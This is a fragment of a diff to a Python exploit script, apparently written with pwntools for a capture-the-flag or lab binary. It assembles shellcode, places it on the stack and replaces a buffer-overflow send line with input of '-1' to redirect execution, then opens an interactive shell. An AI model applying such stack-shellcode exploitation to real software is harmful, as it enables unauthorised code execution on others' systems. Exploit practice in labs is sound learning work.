@@ -71,9 +71,8 @@ if __name__ == "__main__":
     machine_code = asm(shellcode)
     put_shellcode_on_stack(machine_code, process_to_exploit)
 
-    # Now I send the full attack to the process.
-    # This causes the process to overflow the buffer, jump to "call rsp", and execute the shellcode.
-    process_to_exploit.sendline(buffer_overflower + instruction_redirect + shellcode)
+    # Now that everything is on the stack, I need to tell the program I'm done sending it input so I can continue execution to my shellcode.
+    process_to_exploit.sendlineafter(b"number:", b"-1")
 
     # Now I can drop into a shell.
     process_to_exploit.interactive()
